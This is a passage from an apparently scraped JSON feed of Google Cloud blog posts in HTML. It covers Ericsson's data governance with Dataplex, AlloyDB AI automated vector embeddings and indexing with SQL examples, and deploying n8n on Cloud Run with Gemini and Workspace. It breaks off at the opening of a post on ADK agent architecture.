style=\"vertical-align: baseline;\"> Provide discoverable, clean, reliable, and well-understood data to the teams deploying analytics, AI, and automation.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Balance defense and offense:</strong><span style=\"vertical-align: baseline;\"> Ensure compliance with contracts and regulations (defensive governance) while empowering teams to innovate and create value from data (offensive governance).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Ensure data integrity: </strong><span style=\"vertical-align: baseline;\">Ericsson users see data integrity as the core principle for effective data management. Data quality, which is essential for reliable, trustworthy data throughout its lifecycle, is a key quality indicator (KQI) for measuring effectiveness. Any quality deviations must be managed like a high-priority incident with clear Service Level Agreements (SLA) for restoration and resolution.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">To realize this vision, Ericsson sought a platform that could match its ambition for global-scale governance and innovation — and Dataplex Universal Catalog emerged as the ideal choice.</span></p>\n<p><span style=\"vertical-align: baseline;\">Ericsson made its selection based on four key criteria. </span></p>\n<p><span style=\"vertical-align: baseline;\">First, its capabilities aligned perfectly with Ericsson’s requirements for cloud-native transformation, business principles, and a long-term governance vision, underpinned by Ericsson’s strategic partnership with Google Cloud. Second, from a technical standpoint, Dataplex provided a tightly integrated, end-to-end ecosystem as a native Google Cloud solution, translating to faster time-to-market for use cases and reduced integration overhead.</span></p>\n<p><span style=\"vertical-align: baseline;\">Third, the platform offered a practical operating model that enabled quick learning, adaptation, and self-sufficiency, supporting an agile approach where Ericsson could fail fast and iterate. Finally, as an existing Google Cloud customer, Dataplex presented a clear and manageable Total Cost of Ownership (TCO), serving as a natural extension of Ericsson’s existing environment and providing a clear, manageable cost profile for both storage and compute extension with governance capabilities.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Putting governance into practice: Key capabilities in action</strong></h3>\n<p><span style=\"vertical-align: baseline;\">With Dataplex Universal Catalog as the governance foundation, Ericsson began implementing the core pillars of its governance program, moving from manual processes to an automated, intelligent data fabric.</span></p>\n<p><span style=\"vertical-align: baseline;\">More specifically, Ericsson established a unified business vocabulary within Dataplex. This transformative first step eliminated ambiguity and ensured their teams — from data scientists to data analysts — were speaking the same language. These glossaries also captured tribal knowledge and became the foundation for creating trusted data products.</span></p>\n<p><span style=\"vertical-align: baseline;\">In addition, Dataplex's catalog is at the heart of the data governance solution, making data discovery simple and intuitive for authorized users. Ericsson uses its tagging capabilities to enrich the data assets with critical metadata, including data classification, ownership, retention policies, and sensitivity labels. Dataplex’s ability to automatically visualize data lineage, down to the column level, is another game-changer. Different data personas can instantly understand a dataset's origin and its downstream impact, dramatically increasing trust and reducing investigation time. </span><span style=\"vertical-align: baseline;\">Furthermore, trustworthy AI models are built on high-quality data. For proactive data quality, Ericsson uses Dataplex to run automated quality checks and profiles on its data pipelines. When a quality rule is breached, an alert is automatically triggered, creating an incident in its service management platform to ensure data issues are treated with the urgency they deserve.</span></p>\n<p><span style=\"vertical-align: baseline;\">These capabilities are all underpinned by Ericsson's</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">Data Operating Model (DOM), a framework that defines the policies, people, processes, and technology needed to translate its data strategy into tangible value, comprising several facets when working with data.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_nGFHVwm.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><ol>\n<li><strong style=\"vertical-align: baseline;\">Enterprise data architecture:</strong><span style=\"vertical-align: baseline;\"> Managing data flow, enterprise data modeling and best practices for data collection till consumption</span></li>\n<li><strong style=\"vertical-align: baseline;\">Technology and tools</strong><span style=\"vertical-align: baseline;\">: Business glossary, master, reference and metadata management, data modeling, and data quality management</span></li>\n<li><strong style=\"vertical-align: baseline;\">Roles and responsibilities:</strong><span style=\"vertical-align: baseline;\"> Roles to manage and govern data (i.e., end-to-end data lifecycle and stewardship)</span></li>\n<li><strong style=\"vertical-align: baseline;\">Data and model assurance:</strong><span style=\"vertical-align: baseline;\"> Data pipelines monitoring, data observability, and data quality monitoring</span></li>\n<li><strong style=\"vertical-align: baseline;\">Governance: </strong><span style=\"vertical-align: baseline;\">Manage data compliance, risk and security management, managing operational level agreement, objective and key results, and audit management</span></li>\n<li><strong style=\"vertical-align: baseline;\">Processes:</strong><span style=\"vertical-align: baseline;\"> Data governance, data quality, data management, and data consent related processes</span></li>\n</ol>\n<h3><strong style=\"vertical-align: baseline;\">Looking ahead: The future is integrated and intelligent</strong></h3>\n<p><span style=\"vertical-align: baseline;\">As a global technology leader, Ericsson is committed to shaping the future of AI-powered data governance. Technology, especially in the AI space, is evolving at a breathtaking pace and both the data and AI governance practices must keep up. </span></p>\n<p><span style=\"vertical-align: baseline;\">These developments are guiding Ericsson’s future priorities, which include bridging the gap between data and AI governance, especially with the rise of generative and agentic AI. These plans include evaluating using generative AI capabilities in BigQuery and Dataplex to simplify governance and pursuing solutions that ensure transparency, explainability, fairness and manage risk in the deployment of AI models. </span></p>\n<p><span style=\"vertical-align: baseline;\">In addition to harnessing the power of AI for at-scale governance, Ericsson will also include usage of governance workflows, glossary-driven data quality policies, at-scale assignment of terms to assets, bulk import and export of glossaries, AI-powered glossary recommendations, and data quality re-usability functionalities. Ericsson is also aligning its architecture with data fabric and data mesh principles, empowering teams with self-service access to high-quality, trusted data products.</span><span style=\"vertical-align: baseline;\">Finally, Ericsson will be assessing the use of more granular, policy-based access controls to complement existing role-based access, further strengthening its data security, protection and privacy.</span></p>\n<p><span style=\"vertical-align: baseline;\">For any organization embarking on a similar path, Ericsson’s experience offers several key lessons:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Governance is a value enabler, not a blocker:</strong><span style=\"vertical-align: baseline;\"> A modern data governance program is focused on business enablement first, driving value and innovation, to complement policies, rules and risk management.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">It's a journey, not a destination:</strong><span style=\"vertical-align: baseline;\"> Be prepared to fail fast, learn, and adapt. The landscape is constantly changing at breakneck speed.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Focus on business outcomes, not tools:</strong><span style=\"vertical-align: baseline;\"> Technology is a critical enabler, but the conversation is about the business value you’re creating. Simplify the story, speak the language of the business, and unpack the hype.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Culture is everything:</strong><span style=\"vertical-align: baseline;\"> For governance to be effective, it’s the responsibility of everyone. This requires strong leadership, sponsorship, and a \"data-first\" mindset embedded throughout the organization.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">By partnering with Google Cloud and tapping into the power of Dataplex Universal Catalog, Ericsson is building a data foundation that is not only compliant and secure but agile and intelligent — ready to power the next generation of autonomous networks.</span></p></div>",
        "published_date": "2025-11-07 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/databases/alloydb-ai-auto-vector-embeddings-and-auto-vector-index/",
        "title": "AlloyDB accelerates AI with automated vector indexing and embedding",
        "thumbnail": null,
        "author": "Alan Li",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Modern applications store their most valuable data such as product catalogs or user profiles in operational databases. These data stores are excellent for applications that need to handle real-time transactions — and with their support for vector operations, they’ve also become an excellent foundation for modern search or gen AI application serving.</span></p>\n<p><a href=\"https://cloud.google.com/alloydb/ai\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB AI</span></a><span style=\"vertical-align: baseline;\"> provides powerful, high-performance vector capabilities enabling you to generate embeddings inline and manually </span><a href=\"https://docs.cloud.google.com/alloydb/docs/ai/best-practices-tuning-scann\"><span style=\"text-decoration: underline; vertical-align: baseline;\">tune powerful vector indexes</span></a><span style=\"vertical-align: baseline;\">. While you can generate embeddings out of the box for in line search use cases, we also wanted AlloyDB to address the complexity of creating and maintaining huge numbers of vector embeddings. </span></p>\n<p><span style=\"vertical-align: baseline;\">To make this possible, we’re introducing two new features for AlloyDB AI, available in preview, that will empower you to transform your existing operational database into a powerful, AI-native database with just a few lines of SQL:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Auto vector embeddings</strong></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Auto vector index</strong></p>\n</li>\n</ol>\n<p><a href=\"https://cloud.google.com/alloydb/docs/ai/generate-manage-auto-embeddings-for-tables\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Auto vector embeddings</span></a><span style=\"vertical-align: baseline;\"> transform operational data into vector search ready data by vectorizing data stored inside of AlloyDB at scale. The </span><a href=\"https://docs.cloud.google.com/alloydb/docs/ai/create-scann-index#create-scann-index-automatic\"><span style=\"text-decoration: underline; vertical-align: baseline;\">auto vector index</span></a><span style=\"vertical-align: baseline;\"> self-configures vector indexes optimized for customer’s workloads, ensuring high quality and performance.</span></p>\n<p><span style=\"vertical-align: baseline;\">Compare this to the traditional approach of creating the vectors and loading them into your database. The basic steps are familiar to any AI developer: generate vector embeddings using specialized AI models, import the vectors into the database alongside the underlying text, and tune vector indexes. In other words, build an ETL (Extract, Transform, Load) pipeline, extract the data from your database, apply transformations, run it through the AI model, reload and reformat it, then reinsert it into your database and then tune the vector indexes. This approach not only involves significant engineering complexity but also introduces latency, making it difficult to keep your application in sync with your live data despite it being stored alongside it.</span></p>\n<p><span style=\"vertical-align: baseline;\">An additional challenge is to keep the vector index up to date, which is hard to do manually. While manually tuned indexes are performant and provide excellent results, they can be sensitive to updates in the underlying data and require performance and quality testing before they’re ready to hit the road.</span></p>\n<p><span style=\"vertical-align: baseline;\">Let's walk through an example journey of an operational workload and see how AlloyDB AI’s new features remove friction from building enterprise-grade AI, and enable users to modernize applications from their database.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">AlloyDB as a vector database</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Imagine you run a large e-commerce platform with a </span><code style=\"vertical-align: baseline;\">products</code><span style=\"vertical-align: baseline;\"> table in AlloyDB, containing structured data like </span><code style=\"vertical-align: baseline;\">product_id</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">color</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">price</code><span style=\"vertical-align: baseline;\">, and </span><code style=\"vertical-align: baseline;\">inventory_count</code><span style=\"vertical-align: baseline;\">, alongside unstructured data such as </span><code style=\"vertical-align: baseline;\">product_description</code><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">You want to build a gen AI search feature to improve the quality of search in your application and make it more dynamic and personalized for users. You want to evolve from solely supporting simple lexical searches such as  \"jacket\", which perform exact matches, to searches such as \"warm coat for winter\" that can find semantically similar items like jackets, coats or vests. To refine the quality, you also want to combine this semantic matching with structured filters such as </span><code style=\"vertical-align: baseline;\">color = 'maroon'</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">price &lt; 100</code><span style=\"vertical-align: baseline;\">. Some of these filters may even live in a different table, such as an orders table which stores information about the user's order history.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Get started with a 30-day AlloyDB free trial instance&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f9174658160&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">From operational to AI-native</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Before you can get started on application logic, you need to generate embeddings on your data so you can perform a vector search. For this you would typically need to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Build an ETL pipeline to extract </span><code style=\"vertical-align: baseline;\">products</code><span style=\"vertical-align: baseline;\"> data from AlloyDB</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Write custom code to batch the data and send it to an embedding model API on Vertex AI</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Carefully manage rate limits, token limits, and failures</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Write the resulting vectors </span><span style=\"font-style: italic; vertical-align: baseline;\">back</span><span style=\"vertical-align: baseline;\"> into your database</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Build </span><span style=\"font-style: italic; vertical-align: baseline;\">another</span><span style=\"vertical-align: baseline;\"> process to watch for </span><code style=\"vertical-align: baseline;\">UPDATE</code><span style=\"vertical-align: baseline;\"> commands so you can do it again and again, just to keep your data fresh</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">AlloyDB AI’s new feature, auto vector embeddings, eliminates this entire workflow.</span></p>\n<p><span style=\"vertical-align: baseline;\">It provides a fully managed, scalable solution to create and maintain embeddings </span><span style=\"font-style: italic; vertical-align: baseline;\">directly from the database</span><span style=\"vertical-align: baseline;\">. The system batches API calls to Vertex AI, maximizing throughput, and can operate as a background process to ensure that your critical transactions aren't blocked.</span></p>\n<p><span style=\"vertical-align: baseline;\">To generate vector embeddings from your </span><code style=\"vertical-align: baseline;\">product_description</code><span style=\"vertical-align: baseline;\"> column, you just run one SQL command:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;CALL ai.initialize_embeddings(\\r\\n    model_id =&gt; &#x27;gemini-embedding-001&#x27;,\\r\\n    table_name =&gt; &#x27;products&#x27;,\\r\\n    content_column =&gt; &#x27;product_description&#x27;,\\r\\n    embedding_column =&gt; &#x27;product_embedding&#x27;,\\r\\n    incremental_refresh_mode =&gt; &#x27;transactional&#x27;  -- Automatically updates on data changes\\r\\n);&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f91746585e0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Now AlloyDB can handle embedding generation for you. Your </span><code style=\"vertical-align: baseline;\">products</code><span style=\"vertical-align: baseline;\"> table is AI-enabled and  embeddings are automatically updated as your data changes. </span></p>\n<p><span style=\"vertical-align: baseline;\">If you prefer to manually refresh embeddings, you can run the following SQL command: </span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;CALL ai.refresh_embeddings(\\r\\n    table_name =&gt; &#x27;products&#x27;,\\r\\n    embedding_column =&gt; &#x27;product_embedding&#x27;,          -- embedding vector column\\r\\n    batch_size =&gt; 50                                  -- optional override\\r\\n);&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f9174658520&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Turbocharging search with AlloyDB AI </strong></h3>\n<p><span style=\"vertical-align: baseline;\">Now that you have embeddings, you face the second hurdle: performance and quality of search. Say a user searches for \"warm winter coat.\" Your query may look like this:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;SELECT * FROM products\\r\\nWHERE color = &#x27;maroon&#x27;\\r\\nORDER BY product_embedding &lt;-&gt; google_ml.embedding(&#x27;gemini-embedding-001&#x27;, &#x27;warm coat for winter&#x27;)\\r\\nLIMIT 10;&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f9174658340&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">To make this vector search query performant, you need a vector index. But traditional vector indexes require deep expertise: you have to manually configure parameters, rebuild the index periodically as data changes, and hope your tuning is correct. This complexity slows development and adds operational complexity.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;-- Optimal `num_leaves` and `max_num_levels` are based on number of vectors in the\\r\\n-- products table, which means the user will have to figure that out beforehand to\\r\\n-- properly tune the index.\\r\\n\\r\\nCREATE INDEX idx_products_embedding ON products\\r\\nUSING scann (product_embedding)\\r\\nWITH (num_leaves=100000, max_num_levels=2);&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f9174658310&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The new auto vector index feature abstracts all this away and delivers a fully automated and integrated vector search experience that is self-configuring, self-maintaining, and self-tuning. To create a fully optimized index, you just run:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;-- AlloyDB will automatically figure out index configuration underneath the hood.\\r\\nCREATE INDEX idx_products_embedding ON products\\r\\nUSING scann (product_embedding)\\r\\nWITH (mode = &#x27;AUTO&#x27;);&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f9174658490&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">With mode='AUTO', AlloyDB handles everything:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Automatic configuration:</strong><span style=\"vertical-align: baseline;\"> It analyzes your data and automatically configures the index parameters at creation time to meet your performance and quality goals.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Automatic maintenance:</strong><span style=\"vertical-align: baseline;\"> The index updates incrementally and automatically as your data changes, ensuring it remains optimized without any manual intervention. It automatically splits as the index grows in size and automatically updates centroids when data distribution drifts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Automatic query plan optimization:</strong><span style=\"vertical-align: baseline;\"> This is where the real magic happens. The ScaNN index leverages real-time workload statistics to self-tune and optimize te execution plan. For a deeper dive, read our previous blog, </span><a href=\"https://cloud.google.com/blog/products/databases/alloydb-ais-scann-index-improves-search-on-all-kinds-of-data\"><span style=\"text-decoration: underline; vertical-align: baseline;\">A deep dive into AlloyDB’s vector search enhancements</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Two new ways to become AI-native</strong></h3>\n<p><span style=\"vertical-align: baseline;\">With AlloyDB’s new capabilities, making your operational workload AI-native no longer requires complex ETL pipelines and infrastructure code.</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Auto vector embeddings transforms your data by handling the entire embedding generation and management lifecycle inside the database.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Auto vector index simplifies retrieval by providing a self-tuning, self-maintaining index that automatically optimizes complex filtered vector searches.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">By removing this complexity, AlloyDB empowers you to use your existing SQL skills to build and scale world-class AI experiences with speed and confidence, moving projects from proof-of-concept to production faster than ever before. Get started with </span><a href=\"https://cloud.google.com/alloydb/docs/ai/generate-manage-auto-embeddings-for-tables\"><span style=\"text-decoration: underline; vertical-align: baseline;\">auto vector embeddings</span></a><span style=\"vertical-align: baseline;\"> and the </span><a href=\"https://docs.cloud.google.com/alloydb/docs/ai/create-scann-index#create-scann-index-automatic\"><span style=\"text-decoration: underline; vertical-align: baseline;\">auto vector index</span></a><span style=\"vertical-align: baseline;\"> today.</span></p>\n<p><span style=\"vertical-align: baseline;\">To get started, try our</span><a href=\"https://www.google.com/search?q=https://cloud.google.com/alloydb/docs/free-trial\"><span style=\"text-decoration: underline; vertical-align: baseline;\"> 30-day AlloyDB free trial</span></a><span style=\"vertical-align: baseline;\">. New Google Cloud customers also get $300 in free credits.</span></p></div>",
        "published_date": "2025-11-07 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/deploy-n8n-on-cloud-run/",
        "title": "Easy AI workflow automation: Deploy n8n on Cloud Run",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/hero_live.max-600x600.png",
        "author": "Ryan Pei",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><a href=\"https://n8n.io/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">n8n</span></a><span style=\"vertical-align: baseline;\"> is a powerful yet easy-to-use workflow and automation tool for multi-step AI agents, and many teams want a simple, scalable, and cost-effective way to self-host it. With just a few commands, you can deploy n8n to Cloud Run and have it up and running, ready to supercharge your business with AI workflows that can manage spreadsheets, read and draft emails, and more. The </span><a href=\"https://docs.n8n.io/hosting/installation/server-setups/google-cloud-run\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">n8n docs</span></a><span style=\"vertical-align: baseline;\"> now tell you how to deploy the official n8n Docker image to our serverless platform, connect it to Cloud SQL for persistent data storage, call Gemini as the agents’ LLM, and (optionally) connect your workflows directly to Google Workspace.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Deploy n8n to Cloud Run in minutes</strong></h3>\n<p><span style=\"vertical-align: baseline;\">You can deploy the official n8n image directly to Cloud Run. This gives you a managed, serverless environment that automatically scales from zero to handle any workload, so you only pay for what you use. That means whenever you’re not actively using n8n, you’re not paying for any compute and your n8n data is persisted in Cloud SQL.</span></p>\n<p><span style=\"vertical-align: baseline;\">To first try out n8n quickly on Cloud Run, deploy it with this one command:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;gcloud run deploy --image=n8nio/n8n \\\\\\r\\n    --allow-unauthenticated \\\\\\r\\n    --port=5678 \\\\\\r\\n    --no-cpu-throttling \\\\\\r\\n    --memory=2Gi&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f917463ab20&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This gives you a running instance of n8n that you can use to try out n8n and all its awesome features for workflow automation with the power of AI. Connect your first n8n agent to Gemini (provide your Gemini API key for the “Google Gemini Chat Model” credentials) and see it in action.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1 - basic n8n setup\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_-_basic_n8n_setup.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Then when you’re ready to use n8n for actual workflows, you can follow the steps in the </span><a href=\"https://docs.n8n.io/hosting/installation/server-setups/google-cloud-run/#durable-mode\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">n8n docs</span></a><span style=\"vertical-align: baseline;\"> for a more durable, secure setup (using Cloud SQL, Secrets Manager, etc.). You can either use a Terraform script or follow along step-by-step through each gcloud command in the instructions.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Connect Google Workspace tools</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A key benefit of hosting on Google Cloud is the ability to easily connect n8n to your Google Workspace tools. The </span><a href=\"https://docs.n8n.io/hosting/installation/server-setups/google-cloud-run/#optional-enabling-google-workspace-services-as-n8n-tools\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">n8n docs</span></a><span style=\"vertical-align: baseline;\"> walk you through the steps to configure OAuth for Google Cloud, allowing your n8n workflows to securely access and automate tasks using Google tools like Gmail, Google Calendar, and Google Drive.</span></p>\n<p><span style=\"vertical-align: baseline;\">Here’s a demo showing an n8n instance on Cloud Run that uses Gmail and Google Calendar to schedule appointments on your behalf whenever an email hits your inbox with a request to meet:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2 - google workspace n8n\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/2_-_google_workspace_n8n.gif\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The two AI agents in this n8n workflow call Gemini to do the following:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The </span><strong style=\"vertical-align: baseline;\">Text Classifier</strong><span style=\"vertical-align: baseline;\"> reads your incoming emails to see which ones are asking for time to meet</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The </span><strong style=\"vertical-align: baseline;\">Agent</strong><span style=\"vertical-align: baseline;\"> checks your calendar for your availability, and sends a response with a suggested time</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Cloud Run is great for all AI apps</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Cloud Run is a versatile, easy-to-use runtime for all your AI application needs. Whether your agentic app was made with n8n, </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/deploy-langchain-on-cloud-run-with-langserve\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LangChain</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://google.github.io/adk-docs/deploy/cloud-run/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ADK</span></a><span style=\"vertical-align: baseline;\">, or no framework at all, you can deploy it to Cloud Run. This collaboration on Cloud Run and n8n is another example of how we aim to simplify the process for developers to build and deploy intelligent applications.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Next steps</strong></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Read more about </span><a href=\"https://cloud.run/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run</span></a><span style=\"vertical-align: baseline;\"> (or just </span><a href=\"https://console.cloud.google.com/run\"><span style=\"text-decoration: underline; vertical-align: baseline;\">try it out in the web console</span></a><span style=\"vertical-align: baseline;\">!)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Explore </span><a href=\"https://n8n.io/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">n8n</span></a></p>\n</li>\n</ul></div>",
        "published_date": "2025-11-07 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/where-to-use-sub-agents-versus-agents-as-tools/",
        "title": "ADK architecture: When to use sub-agents versus agents as tools",
        "thumbnail": null,
        "author": "Dharini Chandrashekhar",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At its simplest, an agent </span><span style=\"vertical-align: baseline;\">is an application that reasons on how to best achieve a goal based on inputs and tools at its disposal.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_oGjJbVH.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">As you build sophisticated multi-agent AI systems with the Agent Development Kit (ADK), a key architectural decision involves choosing between a sub-agent and an agent as a tool. This choice fundamentally impacts your system's design, how well it scales, and its efficiency. Choosing the wrong pattern can lead to massive overhead — 